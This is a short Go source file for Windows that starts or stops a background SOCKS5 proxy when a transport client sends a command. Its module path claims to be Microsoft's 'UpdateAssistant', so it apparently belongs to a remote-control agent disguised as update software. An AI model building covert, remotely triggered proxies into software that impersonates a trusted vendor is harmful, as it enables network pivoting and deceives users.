//go:build windows

package socks5

import (
	"encoding/json"

	"github.com/microsoft/UpdateAssistant/modules/socks5"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "socks5_start":
		go socks5.Start()
	case "socks5_stop":
		go socks5.Stop()
	}
}
